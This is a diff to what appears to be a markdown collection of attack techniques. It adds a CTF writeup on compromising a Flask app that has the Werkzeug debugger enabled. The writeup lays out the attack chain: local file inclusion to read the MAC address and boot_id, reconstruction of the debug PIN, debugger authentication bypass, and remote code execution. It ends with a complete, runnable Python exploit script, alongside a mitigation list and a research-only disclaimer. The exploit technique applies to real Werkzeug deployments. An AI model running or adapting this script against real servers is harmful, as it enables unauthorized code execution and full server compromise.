@@ -801,6 +801,263 @@ for user_id in range(1, 100):
     if response.status_code == 200:
         print(f'User {user_id}: {response.json()}')
 ```
+# Flask Debug Console PIN Exploit (Werkzeug RCE)
+
+## Overview
+
+This repository contains an exploit targeting a Flask application running with the Werkzeug debugger enabled in production.
+
+The exploit demonstrates how to:
+
+- Abuse Local File Inclusion (LFI)
+- Reconstruct the Werkzeug debug PIN
+- Bypass debugger authentication
+- Achieve Remote Code Execution (RCE)
+- Extract the flag from the server
+
+Target:
+https://my-flask-app.chals.sekai.team:1337
+
+---
+
+## Vulnerability Summary
+
+The application was running in debug mode:
+
+    app.run(debug=True)
+
+This exposed the Werkzeug interactive debugger console at:
+
+    /console
+
+The debugger is protected by a PIN mechanism. However, the PIN is deterministically generated using predictable server values. If those values are leaked, the PIN can be reconstructed.
+
+Additionally, the application contains a Local File Inclusion vulnerability via:
+
+    /view?filename=<path>
+
+This allows reading sensitive files from the server.
+
+---
+
+## Attack Chain
+
+1. Exploit LFI to read:
+   - /sys/class/net/eth0/address
+   - /proc/sys/kernel/random/boot_id
+
+2. Recreate Werkzeug PIN using:
+   - Public bits:
+        - username
+        - module name
+        - application name
+        - flask app file path
+   - Private bits:
+        - MAC address
+        - boot_id
+
+3. Extract the debugger SECRET from /console
+
+4. Authenticate using:
+        __debugger__=yes
+        cmd=pinauth
+        pin=<calculated_pin>
+        s=<secret>
+
+5. Obtain session cookie
+
+6. Execute arbitrary Python code:
+        __import__('os').popen('cat /flag*').read()
+
+7. Retrieve flag
+
+---
+
+## Exploit Flow
+
+The exploit performs the following steps:
+
+- Reads MAC address and boot_id via LFI
+- Reconstructs Werkzeug PIN using SHA1 hashing
+- Retrieves debugger secret token
+- Authenticates to debugger console
+- Executes OS command to read flag
+- Extracts flag using regex
+
+---
+
+## Technical Details
+
+Werkzeug PIN generation logic:
+
+SHA1(probably_public_bits + private_bits + "cookiesalt")
+SHA1(previous_hash + "pinsalt")
+
+The resulting hash is converted into a 9-digit PIN and formatted.
+
+Because MAC address and boot_id are readable through LFI, the PIN becomes predictable.
+
+This allows full debugger authentication bypass.
+
+---
+
+## Impact
+
+- Remote Code Execution
+- Full server compromise
+- Arbitrary command execution
+- Sensitive file disclosure
+
+This vulnerability is critical.
+
+---
+
+## Mitigation
+
+- Never deploy Flask with debug=True in production
+- Remove LFI vulnerabilities
+- Use production WSGI servers (gunicorn / uWSGI)
+- Restrict access to internal endpoints
+- Configure reverse proxy rules
+
+---
+
+## Usage
+
+Install dependencies:
+
+    pip install requests
+
+Run exploit:
+
+    python exploit.py
+
+If successful, the script will output:
+
+    Found Console PIN
+    Found Secret
+    Found Cookie
+    Found flag
+
+---
+
+## Educational Purpose
+
+This repository is created for CTF and security research purposes only.
+
+Do not use this against systems without authorization.
+
+---
+
+## Author
+
+Security Research / CTF Writeup
+## Exploit program 
+```
+from requests import get
+import hashlib
+from itertools import chain
+import re
+
+HOST = "https://my-flask-app.chals.sekai.team:1337"
+
+def getfile(filename):
+    try:
+        response = get(f"{HOST}/view?filename={filename}")
+        return response.text
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+    
+def get_pin(probably_public_bits, private_bits):
+    h = hashlib.sha1()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode('utf-8')
+        h.update(bit)
+    h.update(b'cookiesalt')
+
+    cookie_name = '__wzd' + h.hexdigest()[:20]
+
+    num = None
+    if num is None:
+        h.update(b'pinsalt')
+        num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+    rv =None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                            for x in range(0, len(num), group_size))
+                break
+        else:
+            rv = num
+
+    return rv
+
+def get_secret():
+    response = get(f"{HOST}/console", headers={"Host": "127.0.0.1"})
+    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', response.text)
+
+    if match:
+        return match.group(1)
+    return None
+
+def authenticate(secret, pin):
+    response = get(f"{HOST}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host": "127.0.0.1"})
+    return response.headers.get("Set-Cookie")
+
+def execute_code(cookie, code, secret):
+    response = get(f"{HOST}/console?__debugger__=yes&cmd={code}&frm=0&s={secret}", headers={"Host": "127.0.0.1", "Cookie": cookie})
+    return response.text
+
+if __name__ == "__main__":
+
+    mac = getfile("/sys/class/net/eth0/address")
+    mac = str(int("0x" + "".join(mac.split(":")).strip(), 16))
+    boot_id = getfile("/proc/sys/kernel/random/boot_id").strip()
+    
+    # should be default
+    probably_public_bits = [
+        'nobody',
+        'flask.app',
+        'Flask',
+        '/usr/local/lib/python3.11/site-packages/flask/app.py' # change this to the path of the flask app
+    ]
+
+    private_bits = [
+        mac,
+        boot_id
+    ]
+
+    print("Found Console PIN: ", get_pin(probably_public_bits, private_bits))
+
+    secret = get_secret()
+    print("Found Secret: ", secret)
+
+    cookie = authenticate(secret, get_pin(probably_public_bits, private_bits))
+    print("Found Cookie: ", cookie)
+
+    print("Executing code...")
+
+    output = execute_code(cookie, "__import__('os').popen('cat /flag*').read()", secret)
+    
+    match = re.search(r'SEKAI\{.*\}', output)
+    if match:
+        print("Found flag: ", match.group(0))
+    else:
+        print("No flag found")
+
+    print("Done")
+```
+
+
+
+
+
 
 ### 🎭 Bypass Techniques
 
